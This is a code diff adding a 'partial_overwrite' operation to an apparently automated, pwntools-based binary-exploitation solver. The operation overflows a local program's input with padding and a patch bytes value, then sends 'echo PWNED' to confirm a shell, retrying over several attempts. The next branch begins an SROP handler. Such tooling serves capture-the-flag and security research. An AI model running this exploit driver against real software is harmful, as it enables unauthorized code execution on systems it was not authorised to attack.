@@ -272,6 +272,53 @@ def _handle(request: dict) -> dict:
         return {"ok": False, "error": f"pwntools_unavailable:{IMPORT_ERROR}"}
     op = request.get("op")
     try:
+        if op == "partial_overwrite":
+            path = request["path"]
+            offset = int(request["offset"])
+            patch = bytes.fromhex(request["patch"])
+            prompt = (bytes.fromhex(request["prompt"]) if request.get("prompt")
+                      else None)
+            attempts = int(request.get("attempts", 1))
+            marker = str(request.get("marker") or "PWNED").encode()
+            use_newline = bool(request.get("newline", True))
+            started = time.perf_counter()
+            for _attempt in range(attempts):
+                io = None
+                try:
+                    import os as _os
+                    io = process(path, cwd=_os.path.dirname(path))
+                    pre_prompt = (bytes.fromhex(request["pre_prompt"])
+                                  if request.get("pre_prompt") else None)
+                    pre_send = (bytes.fromhex(request["pre_send"])
+                                if request.get("pre_send") else None)
+                    if pre_prompt is not None:
+                        io.recvuntil(pre_prompt, timeout=3)
+                        io.sendline(pre_send or b"")
+                    if prompt is not None:
+                        io.recvuntil(prompt, timeout=3)
+                    payload = b"0" * offset + patch
+                    if use_newline:
+                        io.sendline(payload)
+                    else:
+                        io.send(payload)
+                    time.sleep(0.2)
+                    if marker == b"PWNED":
+                        io.send(b"echo PWNED; exit\n")
+                    output = io.recvrepeat(1.5) or b""
+                    if marker in output:
+                        return {"ok": True, "data": {
+                            "solved": True, "offset": offset,
+                            "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+                except Exception:  # noqa: BLE001
+                    continue
+                finally:
+                    if io is not None:
+                        try:
+                            io.close()
+                        except Exception:  # noqa: BLE001
+                            pass
+            return {"ok": True, "data": {"solved": False, "error": "payload_failed",
+                                         "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
         if op == "srop":
             from pwn import ELF, SigreturnFrame, constants, context, p64, u64
             from capstone import Cs, CS_ARCH_X86, CS_MODE_64
